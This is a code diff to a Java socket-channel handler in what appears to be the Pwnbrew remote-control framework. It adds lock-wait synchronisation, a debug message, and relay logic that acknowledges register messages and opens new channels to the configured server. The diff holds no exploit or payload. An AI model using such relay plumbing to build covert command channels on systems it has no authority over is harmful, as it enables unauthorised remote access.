@@ -45,7 +45,6 @@ The copyright on this package is held by Securifera, Inc
 
 package pwnbrew.selector;
 
-import pwnbrew.log.RemoteLog;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.nio.ByteBuffer;
@@ -58,11 +57,12 @@ import java.util.Queue;
 import java.util.logging.Level;
 import javax.net.ssl.SSLException;
 import pwnbrew.ClientConfig;
+import pwnbrew.concurrent.LockListener;
 import pwnbrew.log.LoggableException;
+import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.ConnectionManager;
 import pwnbrew.manager.DataManager;
-import pwnbrew.utilities.Constants;
-import pwnbrew.utilities.SocketUtilities;
+import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.Message;
 import pwnbrew.network.PortRouter;
 import pwnbrew.network.PortWrapper;
@@ -70,12 +70,15 @@ import pwnbrew.network.RegisterMessage;
 import pwnbrew.network.ServerPortRouter;
 import pwnbrew.network.relay.RelayManager;
 import pwnbrew.network.socket.SocketChannelWrapper;
+import pwnbrew.utilities.Constants;
+import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.SocketUtilities;
 
 /**
  *
  *  
  */
-public class SocketChannelHandler implements Selectable {
+public class SocketChannelHandler implements Selectable, LockListener{
 
     public static final int SERVER_TYPE = 124;
     public static final int CLIENT_TYPE = 125;
@@ -101,6 +104,8 @@ public class SocketChannelHandler implements Selectable {
     private ByteBuffer localMsgBuffer = null;
     
     private boolean isRegistered = false;
+    
+    private int lockVal = 0;
     
     // ==========================================================================
     /**
@@ -362,14 +367,41 @@ public class SocketChannelHandler implements Selectable {
                                             aMsg.setDestHostId(-1);
 
                                             //Try the default port router
-                                            ClientConfig aConf = ClientConfig.getConfig();
-                                            int thePort = aConf.getSocketPort();
-                                            PortRouter thePR = aSPR.getPortManager().getPortRouter( thePort );
+                                            ClientConfig theConf = ClientConfig.getConfig();
+                                            int theSocketPort = theConf.getSocketPort();
+                                            String serverIp = theConf.getServerIp();
+                                            PortRouter thePR = aSPR.getPortManager().getPortRouter( theSocketPort );
 
                                             //Get the connection manager for the server
                                             ConnectionManager aCM = thePR.getConnectionManager(-1);
                                             if( aCM != null ){
-                                                SocketChannelHandler srvHandler = aCM.getSocketChannelHandler(ConnectionManager.COMM_CHANNEL_ID);
+                                                 
+                                                //Create a new channel if not comms
+                                                int srcChannelId = aMsg.getChannelId();
+                                                if( srcChannelId != ConnectionManager.COMM_CHANNEL_ID ){
+                                                    
+                                                    //Send back the ack
+                                                    RegisterMessage retMsg = new RegisterMessage(RegisterMessage.REG_ACK, chanId);
+                                                    retMsg.setDestHostId(srcHostId);
+                                                    //Try to send back
+                                                    DataManager.send(aSPR.getPortManager(), retMsg);
+                                                    setWrapping( false);
+                                                         
+                                                    if( thePR instanceof ClientPortRouter ){
+                                                        
+                                                        //TODO need to check if the id is taken
+                                                        ClientPortRouter aCPR = (ClientPortRouter)thePR;
+                                                        srcChannelId = aCPR.ensureConnectivity(serverIp, theSocketPort, this);
+
+//                                                        //Set route in relaymanager
+//                                                        RelayManager theRelayManager = RelayManager.getRelayManager();
+//                                                        theRelayManager.addRelayRoute( srcChannelId, retChannelId );
+//
+//                                                        //Set the new channel
+//                                                        aMsg.setChannelId(retChannelId);
+                                                    }
+                                                }
+                                                SocketChannelHandler srvHandler = aCM.getSocketChannelHandler( srcChannelId );
                                                 if( srvHandler != null ){
                                                     byte[] regBytes = aMsg.getBytes();
                                                     srvHandler.queueBytes(regBytes);
@@ -404,6 +436,7 @@ public class SocketChannelHandler implements Selectable {
                                     
                                     } else if( aMsg.getFunction() == RegisterMessage.REG_ACK ) {
                                         
+                                        DebugPrinter.printMessage(NAME_Class, "Received register acknowledge message.");
                                         //Process it if it's meant this host or send it on
                                         if( dstId == hostId )
                                             aMsg.evaluate(thePortRouter.getPortManager());
@@ -811,6 +844,41 @@ public class SocketChannelHandler implements Selectable {
      */
     public synchronized boolean isWrapping() {
         return wrappingFlag;
+    }
+    
+     //===============================================================
+    /**
+     * 
+     * @param lockOp 
+     */
+    @Override
+    public synchronized void lockUpdate(int lockOp) {
+        lockVal = lockOp;
+        notifyAll();
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @return  
+     */
+    @Override
+    public synchronized int waitForLock() {
+        
+        int retVal;        
+        while( lockVal == 0 ){
+            try {
+                wait();
+            } catch (InterruptedException ex) {
+                continue;
+            }
+        }
+        
+        //Set to temp and reset
+        retVal = lockVal;
+        lockVal = 0;
+        
+        return retVal;
     }
 
 }/* END CLASS AccessHandler */
